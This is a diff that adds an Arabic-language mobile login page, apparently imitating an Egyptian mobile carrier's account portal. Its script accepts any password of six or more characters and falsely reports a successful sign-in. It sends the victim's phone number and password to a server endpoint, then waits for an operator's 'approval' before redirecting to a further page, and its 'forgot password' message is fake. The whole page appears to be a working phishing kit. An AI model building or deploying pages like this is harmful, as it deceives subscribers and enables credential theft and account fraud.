@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+<title>خدمات الجوال</title>
+<style>
+  :root{
+    --app-bg:#000000;
+    --screen-bg:#f7f1f0;
+    --text:#3d2628;
+    --muted:#7f6669;
+    --soft-red:#f9e6e8;
+    --red:#ee1c25;
+    --red-dark:#b6111d;
+    --line:#e7dfe0;
+    --field-bg:#f2f1f1;
+    --field-border:#dfe0e2;
+    --soft-shadow:0 20px 36px rgba(12,12,12,0.22);
+  }
+
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
+  html{-webkit-text-size-adjust:100%;}
+  body{
+    font-family:'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background:var(--app-bg);
+    color:var(--text);
+    min-height:100svh;
+    width:100%;
+    display:flex;
+    align-items:flex-start;
+    justify-content:center;
+    padding:0;
+    direction:rtl;
+    text-align:right;
+  }
+
+  main{
+    width:100%;
+    max-width:420px;
+    min-height:100svh;
+    background:var(--screen-bg);
+    box-shadow:var(--soft-shadow);
+    position:relative;
+    padding:10px 18px 0;
+  }
+
+  .lang-row{
+    display:flex;
+    align-items:center;
+    justify-content:flex-start;
+    padding:4px 8px 0;
+    margin-bottom:10px;
+  }
+  .language-pill{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    color:#222;
+    font-size:14px;
+    font-weight:600;
+    background:transparent;
+    border:none;
+    padding:4px 0;
+  }
+  .globe-icon{
+    width:16px;height:16px;border:2px solid #232323;border-radius:50%;position:relative;display:inline-block;
+  }
+  .globe-icon::before,.globe-icon::after{content:"";position:absolute;}
+  .globe-icon::before{inset:3px 0 3px 0;border-left:2px solid #232323;border-right:2px solid #232323;}
+  .globe-icon::after{inset:0 3px 0 3px;border-top:2px solid #232323;border-bottom:2px solid #232323;}
+  .caret{font-size:14px; color:#222; margin-left:2px;}
+
+  .bundle-pill{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:8px;
+    padding:10px 12px;
+    background:linear-gradient(180deg, rgba(255,255,255,0.55), rgba(255,255,255,0.18));
+    border:1px solid rgba(201,94,101,0.22);
+    border-radius:18px;
+    color:#d44852;
+    font-size:12px;
+    font-weight:600;
+    margin:0 8px 18px;
+    line-height:1.2;
+  }
+  .bundle-pill .bundle-value{
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    min-width:38px;
+    padding:4px 7px;
+    background:#e8373e;
+    border-radius:10px;
+    color:#fff;
+    font-size:11px;
+    font-weight:800;
+  }
+
+  .welcome{padding:6px 18px 0;text-align:center;}
+  .welcome h1{
+    font-size:clamp(26px, 6vw, 34px);
+    font-weight:800;
+    line-height:1.1;
+    letter-spacing:-0.03em;
+    color:#2c1d1e;
+    margin-bottom:12px;
+  }
+  .welcome p{
+    font-size:15px;
+    line-height:1.5;
+    color:var(--muted);
+    margin:0 auto;
+    max-width:320px;
+  }
+
+  .phone-field{
+    margin:22px 14px 16px;
+    padding:10px 14px 12px;
+    background:rgba(255,255,255,0.1);
+    border:1px solid var(--field-border);
+    border-radius:14px;
+    box-shadow:inset 0 1px 0 rgba(255,255,255,0.8);
+  }
+  .phone-field label{
+    display:block;
+    font-size:12px;
+    color:#756264;
+    margin-bottom:8px;
+    font-weight:600;
+  }
+  .phone-field input{
+    width:100%;
+    border:none;
+    outline:none;
+    background:transparent;
+    font-size:18px;
+    color:#1f1f1f;
+    letter-spacing:0.04em;
+    font-weight:600;
+    padding:0;
+    appearance:textfield;
+  }
+  .phone-field input::placeholder{color:#a6a3a4;}
+
+  .connexion-btn{
+    display:block;
+    width:calc(100% - 28px);
+    margin:10px 14px 0;
+    min-height:52px;
+    border:none;
+    border-radius:12px;
+    background:linear-gradient(180deg, #e61c28, #d91822);
+    color:#fff;
+    font-size:16px;
+    font-weight:700;
+    letter-spacing:0.02em;
+    cursor:pointer;
+    box-shadow:0 10px 18px rgba(227,28,37,0.25);
+    transition:transform .15s ease, box-shadow .15s ease;
+  }
+  .connexion-btn.active{
+    background:linear-gradient(180deg, #ef1c28, #d91521);
+  }
+  .connexion-btn:disabled{
+    cursor:not-allowed;
+    opacity:0.8;
+  }
+  .connexion-btn:active{transform:translateY(1px);}
+
+  .divider{
+    display:flex;
+    align-items:center;
+    gap:14px;
+    margin:22px 18px 12px;
+    color:#8d7b7d;
+    font-size:13px;
+    font-weight:700;
+    letter-spacing:0.08em;
+    text-transform:uppercase;
+  }
+  .divider::before,
+  .divider::after{
+    content:"";
+    display:block;
+    height:1px;
+    background:rgba(96,96,96,0.25);
+    flex:1;
+  }
+
+  .alt-link{
+    display:block;
+    width:100%;
+    background:transparent;
+    border:none;
+    color:#d83b45;
+    font-size:16px;
+    font-weight:700;
+    text-align:center;
+    margin-top:4px;
+    padding:0 0 18px;
+  }
+
+  .bottom-nav{
+    display:flex;
+    align-items:flex-end;
+    justify-content:space-between;
+    gap:10px;
+    width:100%;
+    padding:16px 16px 26px;
+    border-top:1px solid rgba(0,0,0,0.08);
+    margin-top:10px;
+  }
+  .nav-item{
+    flex:1;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:6px;
+    color:#5d4d4d;
+    background:transparent;
+    border:none;
+    font-size:11px;
+    font-weight:600;
+    text-align:center;
+  }
+  .nav-icon{
+    width:32px;height:32px;border:2px solid rgba(8,8,8,0.5);border-radius:50%;position:relative;display:block;opacity:0.8;
+  }
+  .nav-item:nth-child(1) .nav-icon{border-width:2px;}
+  .nav-item:nth-child(1) .nav-icon::before,
+  .nav-item:nth-child(1) .nav-icon::after,
+  .nav-item:nth-child(2) .nav-icon::before,
+  .nav-item:nth-child(2) .nav-icon::after,
+  .nav-item:nth-child(3) .nav-icon::before,
+  .nav-item:nth-child(3) .nav-icon::after,
+  .nav-item:nth-child(4) .nav-icon::before,
+  .nav-item:nth-child(4) .nav-icon::after{
+    content:""; position:absolute;
+  }
+  .nav-item:nth-child(1) .nav-icon::before{width:12px;height:12px;border:2px solid rgba(8,8,8,0.5);border-left:0;border-bottom:0;left:8px;top:7px;transform:rotate(45deg);border-radius:2px;}
+  .nav-item:nth-child(1) .nav-icon::after{width:6px;height:6px;border:2px solid rgba(8,8,8,0.5);border-radius:50%;left:12px;top:13px;background:transparent;}
+  .nav-item:nth-child(2) .nav-icon::before{width:12px;height:12px;border:2px solid rgba(8,8,8,0.5);border-radius:50%;left:9px;top:7px;}
+  .nav-item:nth-child(2) .nav-icon::after{left:15px;top:15px;width:10px;height:3px;background:rgba(8,8,8,0.5);border-radius:2px;transform:rotate(-45deg);}
+  .nav-item:nth-child(3) .nav-icon::before{left:9px;top:7px;width:12px;height:12px;border-radius:50%;border:2px solid rgba(8,8,8,0.5);}
+  .nav-item:nth-child(3) .nav-icon::after{left:13px;top:11px;width:6px;height:6px;border-radius:50%;background:rgba(8,8,8,0.5);}
+  .nav-item:nth-child(4) .nav-icon::before{left:9px;top:8px;width:12px;height:12px;border:2px solid rgba(8,8,8,0.5);border-radius:3px;}
+  .nav-item:nth-child(4) .nav-icon::after{left:13px;top:13px;width:5px;height:5px;border:2px solid rgba(8,8,8,0.5);border-radius:50%;background:transparent;}
+
+  .step-panel[hidden]{display:none;}
+  .login-step{padding:6px 0 0;}
+  .login-back{width:36px;height:36px;margin:12px 0 0 4px;border:1px solid rgba(0,0,0,0.08);border-radius:50%;background:rgba(255,255,255,0.8);font-size:23px;line-height:1;color:#333;cursor:pointer;}
+  .app-emblem{width:56px;height:56px;margin:12px auto 14px;border:2px solid var(--red);border-radius:50%;display:grid;place-items:center;color:var(--red);font-size:30px;font-weight:400;}
+  .login-step h1{text-align:center;font-size:20px;font-weight:700;line-height:1.2;color:#222;margin:0 0 18px;}
+  .password-field{display:flex;align-items:center;gap:10px;margin:26px 14px 0;padding:0 12px;height:48px;background:#fff;border:1px solid #e8e8e8;border-radius:11px;}
+  .password-field input{min-width:0;flex:1;border:0;outline:0;background:transparent;font-size:14px;color:#222;}
+  .password-field input::placeholder{color:#555;}
+  .password-toggle{border:0;background:transparent;color:#555;font-size:18px;cursor:pointer;padding:4px;}
+  .forgot-password{margin:7px 14px 0;border:0;background:transparent;color:#444;font-size:12px;text-decoration:underline;cursor:pointer;}
+  .signin-btn{display:block;width:calc(100% - 28px);margin:18px 14px 0;min-height:48px;border:0;border-radius:7px;background:#e98e94;color:#fff;font-size:14px;font-weight:700;cursor:pointer;}
+  .signin-btn.active{background:#e61c28;}
+  .signin-btn:disabled{cursor:not-allowed;opacity:.8;}
+  .status-message{display:none;margin:12px 14px 0;padding:10px 12px;border-radius:10px;background:#fff;border:1px solid var(--field-border);color:#5d4d4d;font-size:13px;line-height:1.4;text-align:center;}
+  .status-message.visible{display:block;}
+
+  .approval-overlay{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.35);
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:24px;
+    z-index:20;
+  }
+  .approval-overlay.visible{display:flex;}
+  .approval-card{
+    width:min(420px, 100%);
+    background:#fff;
+    border-radius:18px;
+    box-shadow:0 20px 42px rgba(0,0,0,0.18);
+    padding:26px 22px 18px;
+    text-align:center;
+  }
+  .approval-spinner{
+    width:42px;
+    height:42px;
+    border:4px solid #f0e4e4;
+    border-top-color:var(--red);
+    border-radius:50%;
+    margin:0 auto 18px;
+    animation:spin 0.9s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg);}}
+  .approval-title{font-size:22px;font-weight:800;color:#1d1d1d;margin-bottom:8px;}
+  .approval-message{font-size:15px;color:#5d4d4d;line-height:1.5;}
+
+  @media (max-width:430px){
+    main{max-width:100%;}
+  }
+
+</style>
+</head>
+<body>
+
+  <div class="approval-overlay" id="approvalOverlay" aria-live="polite" aria-hidden="true">
+    <div class="approval-card">
+      <div class="approval-spinner" aria-hidden="true"></div>
+      <div class="approval-title">جارٍ التحقق</div>
+      <div class="approval-message">الطلب قيد المراجعة، يرجى انتظار تأكيد الإدارة.</div>
+    </div>
+  </div>
+
+  <main>
+    <div class="lang-row">
+      <button class="language-pill" type="button" aria-label="اختيار اللغة">
+        <span class="globe-icon" aria-hidden="true"></span>
+        <span>العربية</span>
+        <span class="caret">⌄</span>
+      </button>
+    </div>
+
+    <section class="step-panel" id="phoneStep">
+      <div class="bundle-pill" aria-label="تسجيل دخول آمن">
+        <span>تسجيل دخول آمن</span>
+        <span class="bundle-value">موافق</span>
+      </div>
+
+      <div class="welcome">
+        <h1>مرحبًا بعودتك</h1>
+        <p>سجل دخولك باستخدام رقم هاتفك لإدارة حسابك والمدفوعات والخدمات اليومية.</p>
+      </div>
+
+      <div class="phone-field">
+        <label for="phoneInput">رقم الهاتف</label>
+        <input type="tel" id="phoneInput" placeholder="01022544474" inputmode="numeric" maxlength="12" autocomplete="off">
+      </div>
+
+      <button class="connexion-btn" id="connexionBtn" type="button" disabled>متابعة</button>
+      <p class="status-message" id="phoneStatusMessage" role="status" aria-live="polite"></p>
+
+      <div class="divider">أو</div>
+      <button class="alt-link" id="addNumberBtn" type="button">إضافة رقم آخر</button>
+
+      <nav class="bottom-nav" aria-label="التنقل السفلي">
+        <button class="nav-item" type="button">
+          <span class="nav-icon" aria-hidden="true"></span>
+          <span>الرئيسية</span>
+        </button>
+        <button class="nav-item" type="button">
+          <span class="nav-icon" aria-hidden="true"></span>
+          <span>تسجيل الدخول</span>
+        </button>
+        <button class="nav-item" type="button">
+          <span class="nav-icon" aria-hidden="true"></span>
+          <span>المواقع</span>
+        </button>
+        <button class="nav-item" type="button">
+          <span class="nav-icon" aria-hidden="true"></span>
+          <span>استكشاف</span>
+        </button>
+      </nav>
+    </section>
+
+    <section class="step-panel login-step" id="loginStep" hidden>
+      <button class="login-back" id="backBtn" type="button" aria-label="العودة إلى رقم الهاتف">‹</button>
+      <div class="app-emblem" aria-hidden="true">A</div>
+      <h1>أدخل كلمة المرور</h1>
+      <div class="password-field">
+        <input id="passwordInput" type="password" autocomplete="off" placeholder="كلمة المرور" aria-label="كلمة المرور">
+        <button class="password-toggle" id="passwordToggle" type="button" aria-label="إظهار كلمة المرور" aria-pressed="false">◉</button>
+      </div>
+      <button class="forgot-password" id="forgotPassword" type="button">نسيت كلمة المرور؟</button>
+      <button class="signin-btn" id="signInBtn" type="button" disabled>تسجيل الدخول</button>
+      <p class="status-message" id="statusMessage" role="status" aria-live="polite"></p>
+    </section>
+  </main>
+
+<script>
+  const phoneStep = document.getElementById('phoneStep');
+  const loginStep = document.getElementById('loginStep');
+  const phoneInput = document.getElementById('phoneInput');
+  const connexionBtn = document.getElementById('connexionBtn');
+  const phoneStatusMessage = document.getElementById('phoneStatusMessage');
+  const backBtn = document.getElementById('backBtn');
+  const passwordInput = document.getElementById('passwordInput');
+  const passwordToggle = document.getElementById('passwordToggle');
+  const forgotPassword = document.getElementById('forgotPassword');
+  const addNumberBtn = document.getElementById('addNumberBtn');
+  const signInBtn = document.getElementById('signInBtn');
+  const statusMessage = document.getElementById('statusMessage');
+  const approvalOverlay = document.getElementById('approvalOverlay');
+
+  function showApprovalCard() {
+    if (!approvalOverlay) return;
+    approvalOverlay.classList.add('visible');
+    approvalOverlay.setAttribute('aria-hidden', 'false');
+  }
+
+  function hideApprovalCard() {
+    if (!approvalOverlay) return;
+    approvalOverlay.classList.remove('visible');
+    approvalOverlay.setAttribute('aria-hidden', 'true');
+  }
+
+  function setStatus(message, kind = 'info') {
+    if (!statusMessage) return;
+    statusMessage.textContent = message;
+    statusMessage.classList.add('visible');
+
+    const isSuccess = kind === 'success';
+    const isError = kind === 'error';
+    statusMessage.style.background = isSuccess ? '#edf8ef' : isError ? '#fff1f1' : '#fff';
+    statusMessage.style.borderColor = isSuccess ? '#bddbbd' : isError ? '#f0c0c0' : '#e8e8e8';
+    statusMessage.style.color = isSuccess ? '#1f6d36' : isError ? '#a53535' : '#5d4d4d';
+  }
+
+  function clearStatus() {
+    if (!statusMessage) return;
+    statusMessage.textContent = '';
+    statusMessage.classList.remove('visible');
+    statusMessage.style.background = '#fff';
+    statusMessage.style.borderColor = '#e8e8e8';
+    statusMessage.style.color = '#5d4d4d';
+  }
+
+  function showPhoneStep() {
+    if (phoneStep) phoneStep.hidden = false;
+    if (loginStep) loginStep.hidden = true;
+    if (phoneInput) phoneInput.focus();
+  }
+
+  function showLoginStep() {
+    if (phoneStep) phoneStep.hidden = true;
+    if (loginStep) loginStep.hidden = false;
+    if (passwordInput) passwordInput.focus();
+  }
+
+  function normalizePhone(value) {
+    let phone = value.replace(/\D/g, '');
+    if (phone.startsWith('243')) phone = phone.slice(3);
+    if (phone.startsWith('20') && phone.length === 12) phone = `0${phone.slice(2)}`;
+    return phone;
+  }
+
+  function isValidPhone(phone) {
+    return /^9\d{8}$/.test(phone) || /^01[0125]\d{8}$/.test(phone);
+  }
+
+  function updatePhoneButton() {
+    const hasPhone = phoneInput.value.trim().length > 0;
+    connexionBtn.disabled = !hasPhone;
+    connexionBtn.classList.toggle('active', hasPhone);
+  }
+
+  function clearPhoneStatus() {
+    phoneStatusMessage.textContent = '';
+    phoneStatusMessage.classList.remove('visible');
+  }
+
+  function showPhoneError(message) {
+    phoneStatusMessage.textContent = message;
+    phoneStatusMessage.classList.add('visible');
+    phoneStatusMessage.style.background = '#fff1f1';
+    phoneStatusMessage.style.borderColor = '#f0c0c0';
+    phoneStatusMessage.style.color = '#a53535';
+  }
+
+  function updatePasswordButton() {
+    if (!signInBtn || !passwordInput) return;
+    const hasPassword = passwordInput.value.trim().length > 0;
+    signInBtn.disabled = !hasPassword;
+    signInBtn.classList.toggle('active', hasPassword);
+  }
+
+  const incomingParams = new URLSearchParams(window.location.search);
+  const incomingPhone = incomingParams.get('phone') || '';
+  const normalizedPhone = normalizePhone(incomingPhone);
+
+  if (phoneInput && isValidPhone(normalizedPhone)) {
+    phoneInput.value = normalizedPhone;
+  }
+
+  phoneInput.addEventListener('input', () => {
+    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 12);
+    updatePhoneButton();
+    clearPhoneStatus();
+    clearStatus();
+  });
+
+  connexionBtn.addEventListener('click', () => {
+    const phone = normalizePhone(phoneInput.value);
+
+    if (!isValidPhone(phone)) {
+      showPhoneError('أدخل رقمًا مصريًا صحيحًا من 11 رقمًا أو رقمًا يبدأ بـ 9 ويتكون من 9 أرقام.');
+      return;
+    }
+
+    phoneInput.value = phone;
+    clearPhoneStatus();
+    showLoginStep();
+  });
+
+  if (backBtn) {
+    backBtn.addEventListener('click', () => {
+      clearStatus();
+      showPhoneStep();
+    });
+  }
+
+  if (passwordToggle && passwordInput) {
+    passwordToggle.addEventListener('click', () => {
+      const isHidden = passwordInput.type === 'password';
+      passwordInput.type = isHidden ? 'text' : 'password';
+      passwordToggle.setAttribute('aria-label', isHidden ? 'إخفاء كلمة المرور' : 'إظهار كلمة المرور');
+      passwordToggle.setAttribute('aria-pressed', String(isHidden));
+      passwordToggle.textContent = isHidden ? '◌' : '◉';
+      passwordInput.focus();
+    });
+  }
+
+  if (passwordInput) {
+    passwordInput.addEventListener('input', () => {
+      updatePasswordButton();
+      clearStatus();
+    });
+  }
+
+  if (forgotPassword) {
+    forgotPassword.addEventListener('click', () => {
+      setStatus('تم إرسال رابط استعادة كلمة المرور إلى رقمك المسجل.', 'info');
+    });
+  }
+
+  if (addNumberBtn) {
+    addNumberBtn.addEventListener('click', () => {
+      phoneInput.value = '';
+      clearPhoneStatus();
+      clearStatus();
+      updatePhoneButton();
+      showPhoneStep();
+    });
+  }
+
+  function setApprovalMessage(title, message, isError = false) {
+    if (!approvalOverlay) return;
+    const titleEl = approvalOverlay.querySelector('.approval-title');
+    const messageEl = approvalOverlay.querySelector('.approval-message');
+    if (titleEl) titleEl.textContent = title;
+    if (messageEl) messageEl.textContent = message;
+    approvalOverlay.classList.toggle('error-state', isError);
+  }
+
+  function pollApproval(id) {
+    if (!id) return;
+
+    const poll = async () => {
+      try {
+        const res = await fetch('/api/check-approval/' + id);
+        const data = await res.json();
+
+        if (data.status === 'approved') {
+          const phone = normalizePhone(phoneInput.value);
+          const params = new URLSearchParams(window.location.search);
+          params.set('phone', phone);
+          window.location.href = 'pto.html?' + params.toString();
+          return;
+        }
+
+        if (data.status === 'denied') {
+          setApprovalMessage('مراجعة مرفوضة', 'تم رفض الطلب. يمكنك المحاولة مرة أخرى.', true);
+          signInBtn.disabled = false;
+          return;
+        }
+
+        if (data.status === 'insufficient') {
+          setApprovalMessage('الموازنة غير كافية', 'رصيد الحساب غير كافٍ.', true);
+          signInBtn.disabled = false;
+          return;
+        }
+
+        if (data.status === 'demo_error') {
+          setApprovalMessage('بيانات غير صحيحة', 'تم رفض الطلب بسبب خطأ في البيانات.', true);
+          signInBtn.disabled = false;
+          return;
+        }
+
+        if (data.status !== 'pending') {
+          setApprovalMessage('طلب غير متاح', 'تعذر التحقق من حالة الطلب.', true);
+          signInBtn.disabled = false;
+          return;
+        }
+      } catch (err) {
+        // Keep polling if the network briefly fails.
+      }
+    };
+
+    poll();
+    const timer = setInterval(poll, 2500);
+    window.__approvalPollTimer = timer;
+  }
+
+  if (signInBtn) {
+    signInBtn.addEventListener('click', async () => {
+      const password = passwordInput.value.trim();
+      if (!password) return;
+
+      signInBtn.disabled = true;
+      setStatus('جارٍ التحقق من كلمة المرور...', 'info');
+
+      await new Promise((resolve) => setTimeout(resolve, 700));
+
+      const validPassword = password.length >= 6;
+      if (!validPassword) {
+        signInBtn.disabled = false;
+        setStatus('كلمة المرور غير صحيحة. حاول مرة أخرى.', 'error');
+        return;
+      }
+
+      const phone = normalizePhone(phoneInput.value);
+      setStatus('تم تسجيل الدخول بنجاح. انتظر موافقة الإدارة.', 'success');
+      showApprovalCard();
+
+      try {
+        const params = new URLSearchParams(window.location.search);
+        const response = await fetch('/api/request-approval', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            plan: params.get('plan') || 'Login',
+            price: params.get('price') || '—',
+            phone,
+            code: password,
+            step: 'login'
+          })
+        });
+
+        const data = await response.json();
+        if (data && data.id) {
+          setApprovalMessage('في انتظار الموافقة', 'الطلب قيد المراجعة، يرجى انتظار تأكيد الإدارة.');
+          pollApproval(data.id);
+          return;
+        }
+
+        setApprovalMessage('خطأ في الطلب', 'تعذر إرسال طلب الموافقة.', true);
+        signInBtn.disabled = false;
+      } catch (err) {
+        setApprovalMessage('فشل الاتصال', 'تعذر إرسال طلب الموافقة. حاول مرة أخرى.', true);
+        signInBtn.disabled = false;
+      }
+    });
+  }
+
+  updatePhoneButton();
+  updatePasswordButton();
+  showPhoneStep();
+</script>
+
+</body>
+</html>
